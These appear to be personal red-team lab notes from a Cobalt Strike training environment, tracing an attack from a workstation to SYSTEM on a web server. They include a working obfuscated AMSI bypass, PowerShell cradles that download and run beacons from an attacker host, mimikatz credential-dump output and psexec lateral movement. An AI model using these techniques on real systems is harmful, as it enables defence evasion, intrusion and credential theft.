WKSTN 1 (bfarmer)
-> WKSTN 2 (SYSTEM)
-->
# Initial Access to `WKSTN-2` as `bfarmer` 
[[1. initial_access_Notes]]

Originally access was obtained via a `phishing` email, however for us we just logged into `WKSTN-1`, opened up a `powershell` ran an `AMSI` bypass and popped a beacon.
Commands used:

opened WKSTN-2 and ran amsi bypass in powershell session
```powershell
#obfuscated oneliner amsi bypass
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```
PowerShell command to close prompt after executing `beacon` executable
```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))"
```
PowerShell command to utilize [[Manual AMSI Bypass]]
```powershell
iex (new-object net.webclient).downloadstring("http://10.10.5.50:80/bypass"); iex (new-object net.webclient).downloadstring("http://10.10.5.50:80/a")
```
# Privilege Escalation to `SYSTEM` on `WKSTN-2`
utilized `SharpUp` to identify `Unquoted Service Path` [[2. unquoted_service_path_Identification]]
```powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
=== SharpUp: Running Privilege Escalation Checks ===

[*] In medium integrity but user is a local administrator- UAC can be bypassed.

[*] Audit mode: running an additional 1 check(s).

=== Services with Unquoted Paths ===
	Service 'VulnService1' (StartMode: Automatic) has executable 'C:\Program Files\Vulnerable Services\Service 1.exe', but 'C:\Program Files\Vulnerable Services\Service' is modifable.



[*] Completed Privesc Checks in 0 seconds
```
[[2.1 unquoted_service_path_abuse_artifact_Kit]]
utilized `artifact kit` to create `beacon` executables that would bypass defender, uploaded the file to the location `C:\Program Files\Vulnerable Services\Service.exe`. Ran `VulnService1` and utilized `connect localhost 4444` to spawn a `SYSTEM`beacon

once on as `SYSTEM` ran the command `mimikatz !sekurlsa::logonpasswords` and obtained `jking`'s `NTLM` hash
[[Penetration Testing v2/htb_pro_Labs/offshore/access_Tracker|access_Tracker]]

```powershell
	 [00000003] Primary
	 * Username : jking
	 * Domain   : DEV
	 * NTLM     : 59fc0f884922b4ce376051134c71e22c
	 * SHA1     : 74fa9854d529092b92e0d9ebef7ce3d065027f45
	 * DPAPI    : 0837e40088a674327961e1d03946f5f2
	tspkg :	
```

# Lateral Movement to `dev\jking` on `WKSTN-2`
used the `GUI` of `COBALTSTRIKE` to inject into process owned by jking, make sure to utilize `tcp-localhost` for lateral movement 
```powershell
beacon> inject 452 x64 tcp-localhost
[*] Tasked beacon to inject windows/beacon_bind_tcp (127.0.0.1:4444) into 452 (x64)
[+] host called home, sent: 297529 bytes
[+] established link to child beacon: 10.10.123.102
```
note that `jking` is part o the `support engineers` group based off [[Get-DomainUser]]
```powershell
samaccountname                 : jking
memberof                       : {CN=Internet Users,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=MS SQL Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Support Engineers,CN=Users,DC=dev,DC=cyberbotic,DC=io}
cn                             : {John King}
objectclass                    : {top, person, organizationalPerson, user}
displayname                    : John King
```
all groups that `dev\jking` is a part of
```powershell
beacon> run whoami /groups
[*] Tasked beacon to run: whoami /groups
[+] host called home, sent: 32 bytes
[+] received output:

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes                                                     
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                      Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                              Well-known group S-1-2-1                                      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group             
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group             
DEV\MS SQL Admins                          Group            S-1-5-21-569305411-121244042-2357301523-1113 Mandatory group, Enabled by default, Enabled group             
DEV\Internet Users                         Group            S-1-5-21-569305411-121244042-2357301523-1118 Mandatory group, Enabled by default, Enabled group             
DEV\Support Engineers                      Group            S-1-5-21-569305411-121244042-2357301523-1108 Mandatory group, Enabled by default, Enabled group             
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level       Label            S-1-16-12288     
```
[[Get-DomainComputer]] shows all computers in the Domain
```powershell
dnshostname                    : dc-2.dev.cyberbotic.io
dnshostname                    : wkstn-2.dev.cyberbotic.io
dnshostname                    : web.dev.cyberbotic.io
dnshostname                    : sql-2.dev.cyberbotic.io
dnshostname                    : wkstn-1.dev.cyberbotic.io
dnshostname                    : fs.dev.cyberbotic.io
```
targeting `WEB` first, utiling `ping` against `HN` to identify IP address
```powershell
beacon> run ping web
[*] Tasked beacon to run: ping web
[+] host called home, sent: 26 bytes
[+] received output:

Pinging web.dev.cyberbotic.io [10.10.122.30] with 32 bytes of data:
Reply from 10.10.122.30: bytes=32 time<1ms TTL=128
Reply from 10.10.122.30: bytes=32 time<1ms TTL=128
Reply from 10.10.122.30: bytes=32 time<1ms TTL=128
Reply from 10.10.122.30: bytes=32 time<1ms TTL=128

Ping statistics for 10.10.122.30:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```
utilized `portscan`
```powershell
beacon> portscan 10.10.122.30
[*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 10.10.122.30
[+] host called home, sent: 95030 bytes
[+] received output:
(ICMP) Target '10.10.122.30' is alive. [read 8 bytes]

[+] received output:
10.10.122.30:5985
10.10.122.30:3389
10.10.122.30:443
10.10.122.30:139
10.10.122.30:135
10.10.122.30:80
10.10.122.30:445 (platform: 500 version: 10.0 name: WEB domain: DEV)
Scanner module is complete
```
listing the directory we can see that we have access to `web\c$` as `jking`
```powershell
beacon> ls \\web.dev.cyberbotic.io\c$
[*] Tasked beacon to list files in \\web.dev.cyberbotic.io\c$
[+] host called home, sent: 44 bytes
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 08:38:47   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     12/19/2023 21:51:47   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     11/02/2022 09:32:00   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     09/26/2023 08:51:14   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     02/05/2024 23:55:16   DumpStack.log.tmp
 384mb    fil     02/05/2024 23:55:16   pagefile.sys
```
# PSexec64 to `SYSTEM` on `WEB`
going to `jump`, `winrm` failed, `psexec worked`
```powershell
beacon> jump psexec64 10.10.122.30 smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-1337imherebitch) on 10.10.122.30 via Service Control Manager (\\10.10.122.30\ADMIN$\0604669.exe)
[+] host called home, sent: 332054 bytes
[+] received output:
Started service 0604669 on 10.10.122.30
[+] host called home, sent: 65 bytes
[+] established link to child beacon: 10.10.122.30
```
can also use [[4. Pivoting with Kerberos]]
